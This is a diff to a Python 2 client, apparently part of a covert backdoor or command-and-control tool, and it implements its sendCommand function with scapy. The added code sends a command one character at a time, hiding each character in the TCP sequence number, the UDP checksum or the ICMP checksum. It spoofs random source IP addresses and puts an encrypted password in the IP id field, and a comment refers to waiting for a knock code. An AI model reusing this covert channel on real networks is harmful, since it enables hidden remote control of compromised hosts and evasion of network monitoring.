@@ -1,4 +1,5 @@
 import socket
+from scapy.all import *
 from struct import *
 import sys
 import threading
@@ -38,7 +39,22 @@ def startClient(serverIP, proto, intf):
 
 def sendCommand(command):
 	# send your command, make sure you set the password in the ip id field (ipHeader[3])
-	print "sendCommand"
+	pswd = utils.encrypt(config.password)
+
+	for c in command:
+		packet = IP(dst=server, src=RandIP(), id=pswd)
+		if protocol == 'tcp':
+			proto = TCP(dport=RandNum(1024, 65535), sport=RandNum(1024, 65535), seq=ord(c))
+		elif protocol == 'udp':
+			proto = UDP(dport=RandNum(1024, 65535), sport=RandNum(1024, 65535), chksum=ord(c))
+		elif protocol == 'icmp':
+			proto = ICMP(chksum=ord(c))
+		packet = packet/proto
+		send(packet)
+		# packet.show()
+	print "sent all packets"
+	print pswd
+
 
 def recvThread():
 	# wait for the knock code
